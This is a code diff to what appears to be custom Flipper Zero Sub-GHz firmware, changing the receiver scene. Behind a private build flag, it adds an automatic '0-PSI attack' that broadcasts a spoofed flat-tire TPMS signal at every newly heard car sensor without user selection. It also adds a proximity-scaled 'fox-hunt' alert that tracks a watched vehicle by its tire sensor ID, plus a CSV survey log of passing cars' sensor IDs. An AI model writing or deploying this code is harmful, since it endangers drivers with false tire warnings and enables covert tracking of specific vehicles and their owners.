@@ -1,12 +1,23 @@
 #include "../subghz_i.h"
+#include "../helpers/subghz_proto_filter.h"
+#ifdef BOARD_INCLUDE
+#include BOARD_INCLUDE
+#endif
+#ifdef BOARD_HAS_TILT_NAV
+#include "target_input.h"
+#endif
 #ifndef PUBLIC_BUILD
 #include "../helpers/tpms_watch.h"
+#include "../helpers/tpms_survey.h"
 #include <lib/subghz/protocols/tpms_generic.h>
 #include <lib/flipper_format/flipper_format.h>
 #endif
 #include <dolphin/dolphin.h>
 #include <lib/subghz/protocols/bin_raw.h>
 #include <lib/subghz/protocols/base.h>
+#ifndef PUBLIC_BUILD
+#include <lib/subghz/protocols/audi_v1.h> // SUBGHZ_PROTOCOL_AUDI_V1_NAME (frequency gate)
+#endif
 #include "../helpers/subghz_capture_quality.h"
 
 #define TAG "SubGhzSceneReceiver"
@@ -77,6 +88,18 @@ static void subghz_scene_receiver_update_statusbar(void* context) {
             subghz->txrx, frequency_str, modulation_str, false);
 #endif
 
+#ifndef PUBLIC_BUILD
+        // Survey mode: append a compact "logged/unique-sensors" tally to the modulation
+        // field (~= sensors/4 vehicles), so the sweep progress is visible on screen.
+        if(subghz->tpms_survey_mode && subghz->tpms_survey_log) {
+            furi_string_cat_printf(
+                modulation_str,
+                "  S:%lu/%u",
+                (unsigned long)tpms_survey_count((TpmsSurveyLog*)subghz->tpms_survey_log),
+                tpms_survey_unique((TpmsSurveyLog*)subghz->tpms_survey_log));
+        }
+#endif
+
         subghz_view_receiver_add_data_statusbar(
             subghz->subghz_receiver,
             furi_string_get_cstr(frequency_str),
@@ -117,6 +140,13 @@ static void subghz_scene_add_to_history_callback(
     SubGhz* subghz = context;
     s_last_decode_tick = furi_get_tick(); // a decoder matched -> the signal is decoding
 
+    // [PROTO FILTER] Drop decodes for protocols the user switched OFF in
+    // Receiver Config -> "Protocol Filter". Keeps them out of the history list.
+    if(subghz_proto_filter_contains(decoder_base->protocol->name)) {
+        subghz_receiver_reset(receiver);
+        return;
+    }
+
     // TPMS scanner: only admit TPMS-sensor decodes to the list (drop garage remotes
     // and everything else on the band). Set only when entered via the private
     // "TPMS Spoofer" menu; the general Read receiver leaves tpms_scan_mode false.
@@ -125,8 +155,46 @@ static void subghz_scene_add_to_history_callback(
         return;
     }
 
+#ifndef PUBLIC_BUILD
+    // Auto-fire: silently drop a TPMS sensor we have ALREADY auto-fired 0-PSI at this
+    // scan session so it is not re-listed or re-fired; its existing (ticked) list row
+    // stays. Manual/Survey keep every detection — gated on auto-fire being enabled.
+    if(subghz->tpms_scan_mode && subghz->tpms_auto_fire_enabled &&
+       decoder_base->protocol->type == SubGhzProtocolTypeTpms && subghz->tpms_fired_count) {
+        FlipperFormat* fired_chk = flipper_format_string_alloc();
+        SubGhzRadioPreset fired_pr = subghz_txrx_get_preset(subghz->txrx);
+        TPMSBlockGeneric fired_g = {0};
+        bool drop =
+            subghz_protocol_decoder_base_serialize(decoder_base, fired_chk, &fired_pr) ==
+                SubGhzProtocolStatusOk &&
+            tpms_block_generic_deserialize(&fired_g, fired_chk) == SubGhzProtocolStatusOk &&
+            subghz_tpms_fired_contains(subghz, fired_g.id);
+        flipper_format_free(fired_chk);
+        if(drop) {
+            subghz_receiver_reset(receiver);
+            return;
+        }
+    }
+#endif
+
     // The check can be moved to /lib/subghz/receiver.c, but may result in false positives
     if((decoder_base->protocol->flag & subghz->ignore_filter) == 0) {
+#ifndef PUBLIC_BUILD
+        // [AUDI/FIAT FREQ GATE] Audi V1 (VAG rolling remote, real band 434.42 MHz)
+        // carries no in-frame checksum, and its Manchester sync/header/preamble
+        // framing overlaps Fiat V1 (433.92 MHz) closely enough that a repeated Fiat
+        // frame false-positives as Audi V1 (~half of buttons pass Audi's weak
+        // button-nibble guard). The two protocols live on clearly separated bands,
+        // so drop an "Audi V1" decode whenever the RX frequency is not in Audi's
+        // band. Real Audi at 434.42 still decodes; Fiat at 433.92 no longer mis-shows.
+        if(strcmp(decoder_base->protocol->name, SUBGHZ_PROTOCOL_AUDI_V1_NAME) == 0) {
+            uint32_t rx_freq = subghz_txrx_get_preset(subghz->txrx).frequency;
+            if(rx_freq < 434120000UL || rx_freq > 434720000UL) { // 434.42 MHz +/- 300 kHz
+                subghz_receiver_reset(receiver);
+                return;
+            }
+        }
+#endif
         SubGhzHistory* history = subghz->history;
         FuriString* item_name = furi_string_alloc();
         FuriString* item_time = furi_string_alloc();
@@ -199,16 +267,50 @@ static void subghz_scene_add_to_history_callback(
                 notification_message(subghz->notifications, &sequence_error);
             }
 #ifndef PUBLIC_BUILD
-            // Car-tracker: if this TPMS sensor is on the watch list, the target
-            // vehicle is nearby — alert (double vibro + blink).
+            // Car-tracker + Survey: decode the sensor once, alert if it is on the
+            // watch list, and (in Survey mode) append it to the CSV log.
             if(subghz->tpms_scan_mode) {
                 TPMSBlockGeneric g = {0};
                 FlipperFormat* raw = subghz_history_get_raw_data(subghz->history, idx);
-                if(raw && tpms_block_generic_deserialize(&g, raw) == SubGhzProtocolStatusOk &&
-                   tpms_watch_contains(g.id)) {
-                    notification_message(subghz->notifications, &sequence_double_vibro);
-                    notification_message(subghz->notifications, &sequence_blink_cyan_10);
+                if(raw && tpms_block_generic_deserialize(&g, raw) == SubGhzProtocolStatusOk) {
+                    if(!subghz->tpms_auto_fire_pending)
+                        subghz->tpms_auto_fire_sensor_id = g.id; // the auto-fire arm target
+                    float rssi = subghz_txrx_radio_device_get_rssi(subghz->txrx);
+                    if(tpms_watch_contains(g.id)) {
+                        // Fox-hunt: scale the alert by proximity — stronger RSSI (the
+                        // watched vehicle is closer) = more/harder vibro pulses.
+                        notification_message(subghz->notifications, &sequence_blink_cyan_10);
+                        notification_message(subghz->notifications, &sequence_double_vibro);
+                        if(rssi > -75.0f)
+                            notification_message(subghz->notifications, &sequence_double_vibro);
+                        if(rssi > -55.0f)
+                            notification_message(subghz->notifications, &sequence_double_vibro);
+                    }
+                    if(subghz->tpms_survey_mode && subghz->tpms_survey_log) {
+                        tpms_survey_log(
+                            (TpmsSurveyLog*)subghz->tpms_survey_log,
+                            proto_name,
+                            g.id,
+                            g.pressure,
+                            g.temperature,
+                            g.battery_low,
+                            subghz->tpms_scan_freq ? subghz->tpms_scan_freq : 433920000,
+                            (int)rssi);
+                    }
                 }
+            }
+            // Auto-fire 0-PSI attack: mark this fresh TPMS pickup so the scene tick
+            // routes to it and auto-starts the flat-tire spoof — hands-off, no select.
+            // (Runs in the RX worker; the actual route/TX happens on the scene tick.)
+            // Only arm for TRANSMITTABLE protocols: a TPMS frame can cross-decode
+            // under a protocol with no encoder/packer, and firing that would fail
+            // with "Error in protocol parameters". is_packable keeps the auto-attack
+            // hands-off yet safe.
+            if(subghz->tpms_scan_mode && subghz->tpms_auto_fire_enabled &&
+               !subghz->tpms_auto_fire_pending &&
+               subghz_scene_receiver_info_tpms_is_packable(proto_name)) {
+                subghz->tpms_auto_fire_idx = idx;
+                subghz->tpms_auto_fire_pending = true;
             }
 #endif
             subghz_rx_key_state_set(subghz, SubGhzRxKeyStateAddKey);
@@ -230,8 +332,21 @@ static void subghz_scene_add_to_history_callback(
 
 void subghz_scene_receiver_on_enter(void* context) {
     SubGhz* subghz = context;
+#ifdef BOARD_HAS_TILT_NAV
+    /* Ignore tilt -> Left/Right while this always-on RX view is capturing, so an
+     * accidental roll cannot open the freq Config menu and interrupt the scan. */
+    target_input_set_tilt_nav_suppressed(true);
+#endif
     SubGhzHistory* history = subghz->history;
     s_last_decode_tick = 0; // reset capture-quality decode tracking
+    subghz->tpms_auto_fire_pending = false; // clear any stale auto-fire arm
+    subghz->tpms_auto_fire_on_open = false;
+    // Survey mode: open the CSV log once (persists across a sensor-info visit).
+#ifndef PUBLIC_BUILD
+    if(subghz->tpms_scan_mode && subghz->tpms_survey_mode && !subghz->tpms_survey_log) {
+        subghz->tpms_survey_log = tpms_survey_open();
+    }
+#endif
 
     FuriString* item_name = furi_string_alloc();
     FuriString* item_time = furi_string_alloc();
@@ -241,18 +356,25 @@ void subghz_scene_receiver_on_enter(void* context) {
 #ifndef PUBLIC_BUILD
             tpms_watch_load(); // car-tracker: load watched sensor IDs for alerting
 #endif
-            // Force the standard TPMS modulation (433.92 MHz, 2-FSK ~47.6 kHz dev,
-            // registered as preset "FM238") regardless of last_settings, so nearby
-            // sensors decode. MUST go through set_preset_internal so the CC1101
-            // register data is resolved from the setting — the raw set_preset(name,
-            // NULL) leaves preset->data == NULL and crashes on rx_start.
-            SubGhzSetting* setting = subghz_txrx_get_setting(subghz->txrx);
-            int fm_idx = subghz_setting_get_inx_preset_by_name(setting, "FM238");
+            // Tune the band + modulation picked in TPMS Scan Setup
+            // (subghz->tpms_scan_freq / tpms_scan_preset_idx) so 315 MHz / OOK /
+            // FSK-wide sensors are heard, not just 433.92/FM238. Legacy fallback
+            // (freq 0) resolves to 433.92 MHz / FM238. MUST go through
+            // set_preset_internal so the CC1101 register data is resolved from the
+            // setting — raw set_preset(name, NULL) leaves preset->data == NULL and
+            // crashes on rx_start.
+            uint32_t scan_freq = subghz->tpms_scan_freq ? subghz->tpms_scan_freq : 433920000;
+            uint8_t scan_preset = subghz->tpms_scan_preset_idx;
+            if(!subghz->tpms_scan_freq) {
+                // Legacy fallback: use the TPMS-tuned preset (19.2 kBaud / 28.6 kHz),
+                // NOT stock FM238 (4.8 kBaud) which smears TPMS transitions.
+                SubGhzSetting* setting = subghz_txrx_get_setting(subghz->txrx);
+                int fm_idx = subghz_setting_get_inx_preset_by_name(setting, "TPMS");
+                if(fm_idx < 0) fm_idx = subghz_setting_get_inx_preset_by_name(setting, "FM238");
+                scan_preset = (uint8_t)(fm_idx >= 0 ? fm_idx : 0);
+            }
             subghz_txrx_set_preset_internal(
-                subghz->txrx,
-                433920000,
-                (uint8_t)(fm_idx >= 0 ? fm_idx : 0),
-                subghz->last_settings->tx_power);
+                subghz->txrx, scan_freq, scan_preset, subghz->last_settings->tx_power);
         } else {
             subghz_txrx_set_preset_internal(
                 subghz->txrx,
@@ -267,6 +389,9 @@ void subghz_scene_receiver_on_enter(void* context) {
         subghz->tx_power = subghz->last_settings->tx_power;
 
         subghz_history_reset(history);
+#ifndef PUBLIC_BUILD
+        subghz_tpms_fired_clear(subghz); // fresh scan -> forget which sensors were fired
+#endif
         subghz_rx_key_state_set(subghz, SubGhzRxKeyStateStart);
         subghz->idx_menu_chosen = 0;
     }
@@ -286,6 +411,11 @@ void subghz_scene_receiver_on_enter(void* context) {
             furi_string_get_cstr(item_time),
             subghz_history_get_type_protocol(history, i));
         subghz_rx_key_state_set(subghz, SubGhzRxKeyStateAddKey);
+#ifndef PUBLIC_BUILD
+        if(subghz_history_get_fired(history, i)) {
+            subghz_view_receiver_mark_item_fired(subghz->subghz_receiver, i, true);
+        }
+#endif
     }
     furi_string_free(item_name);
     furi_string_free(item_time);
@@ -347,6 +477,14 @@ bool subghz_scene_receiver_on_event(void* context, SceneManagerEvent event) {
             consumed = true;
             break;
         case SubGhzCustomEventViewReceiverOK:
+#ifndef PUBLIC_BUILD
+            // Vuln Scan: assess the opened capture instead of the normal info view.
+            if(subghz->vuln_scan_mode) {
+                scene_manager_next_scene(subghz->scene_manager, SubGhzSceneVulnAssess);
+                consumed = true;
+                break;
+            }
+#endif
             // Show file info, scene: receiver_info
             scene_manager_next_scene(subghz->scene_manager, SubGhzSceneReceiverInfo);
             dolphin_deed(DolphinDeedSubGhzReceiverInfo);
@@ -389,6 +527,21 @@ bool subghz_scene_receiver_on_event(void* context, SceneManagerEvent event) {
             break;
         }
     } else if(event.type == SceneManagerEventTypeTick) {
+#ifndef PUBLIC_BUILD
+        // Auto-fire 0-PSI: the RX callback flagged a fresh TPMS pickup. Select it,
+        // stop RX, and route to its info screen with the flat-tire spoof pre-armed
+        // (receiver_info on_enter auto-starts it). Hands-off: appears -> spoofed.
+        if(subghz->tpms_auto_fire_pending) {
+            subghz->tpms_auto_fire_pending = false;
+            subghz->idx_menu_chosen = subghz->tpms_auto_fire_idx;
+            subghz_view_receiver_set_idx_menu(subghz->subghz_receiver, subghz->idx_menu_chosen);
+            subghz->tpms_auto_fire_on_open = true;
+            // Mirror the OK-select route (leave RX running; the fire handler's
+            // tx_start performs the RX->TX handoff, and try_tpms needs the decoder).
+            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneReceiverInfo);
+            return true;
+        }
+#endif
         if(subghz_txrx_hopper_get_state(subghz->txrx) != SubGhzHopperStateOFF) {
             subghz_txrx_hopper_update(subghz->txrx, subghz->last_settings->hopping_threshold);
             subghz_scene_receiver_update_statusbar(subghz);
@@ -433,8 +586,20 @@ bool subghz_scene_receiver_on_event(void* context, SceneManagerEvent event) {
 }
 
 void subghz_scene_receiver_on_exit(void* context) {
+#ifdef BOARD_HAS_TILT_NAV
+    target_input_set_tilt_nav_suppressed(false);
+#endif
     SubGhz* subghz = context;
+    // Close the survey CSV if it was open.
+#ifndef PUBLIC_BUILD
+    if(subghz->tpms_survey_log) {
+        tpms_survey_close((TpmsSurveyLog*)subghz->tpms_survey_log);
+        subghz->tpms_survey_log = NULL;
+    }
+#endif
     // Leaving the receiver clears TPMS scan mode so the next normal "Read" tunes
     // from last_settings again (not forced to 433.92 FSK / TPMS-only).
     subghz->tpms_scan_mode = false;
+    subghz->tpms_fired_count = 0; // forget auto-fired sensors when leaving the scan
+    subghz->vuln_scan_mode = false;
 }
